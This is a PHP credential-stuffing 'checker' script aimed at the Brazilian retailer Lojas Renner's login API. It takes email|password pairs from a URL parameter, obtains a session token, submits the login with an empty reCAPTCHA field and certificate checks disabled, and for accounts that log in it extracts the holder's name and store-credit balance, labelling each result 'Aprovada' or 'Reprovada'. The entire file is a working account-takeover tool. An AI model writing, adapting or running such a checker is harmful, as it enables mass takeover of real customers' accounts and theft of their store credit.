<?php
error_reporting(0);
session_start();


$lista = $_GET['lista'];

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];
$lista = ("$email|$senha");


if (file_exists("coki.txt") !== false) {
  unlink("coki.txt");
}


function getStr($separa, $inicia, $fim, $contador)
{
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

sleep(5);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/atg/rest/SessionConfirmationActor/getSessionConfirmationNumberAsString?pushSite=rennerBrasilDesktop");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/coki.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/coki.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: www.lojasrenner.com.br',
  'sec-ch-ua: "Google Chrome";v3="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'content-type: application/json',
  'accept: */*',
  'referer: https://www.lojasrenner.com.br/lst'
));
$wr1 = curl_exec($ch);

$idSs = getStr($wr1, '"sessionConfirmationNumber":"', '"', 1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/atg/userprofiling/ProfileActor/login?_dynSessConf=$idSs&pushSite=rennerBrasilDesktop");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/coki.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/coki.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: www.lojasrenner.com.br',
  'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
  'content-type: application/json',
  'accept: */*',
  'referer: https://www.lojasrenner.com.br/lst'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"realmId":"renner","g-recaptcha-response":"","login":"' . $email . '","password":"' . $senha . '"}');
$wr = curl_exec($ch);


$retorno = getStr($wr, '{"localizedMessage":"', '"', 1);


if (strpos($wr, 'localizedMessage')) {


  echo "<span style='color: #FF616C;'>Reprovada » $lista » Motivo: $retorno » @@CENTRAL 1.0<br></span>";
  exit();
} else {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/rest/model/lrsa/api/profile/ProfileActor/getProfile?_dynSessConf=$idSs&pushSite=rennerBrasilDesktop&reset=true");
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/coki.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/coki.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.lojasrenner.com.br',
    'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'content-type: application/json',
    'accept: */*',
    'referer: https://www.lojasrenner.com.br/lst'
  ));
  $wr2 = curl_exec($ch);

  $nome = getStr($wr2, '"firstName":"', '"', 1);

  $sobrenome = getStr($wr2, '"lastName":"', '"', 1);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.lojasrenner.com.br/store/renner/mobile/br/cartridges/MyAccountStoreCredit/fragments/MyAccountStoreCreditCacheCheck.jsp");
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/coki.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/coki.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.lojasrenner.com.br',
    'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'accept: */*',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'referer: https://www.lojasrenner.com.br/minha-conta/vales-troca'
  ));
  $wr3 = curl_exec($ch);


  $vale = getStr($wr3, '<h2 class="menu-content__subtitle show-mobile">', '</h2>', 1);


  if (strpos($wr2, 'lastName')) {

    echo "<span style='color: #4DA200;'>Aprovada » $lista » NOME: $nome $sobrenome » TOTAL EM VALES: $vale » @CENTRAL 1.0<br></span>";
  }
}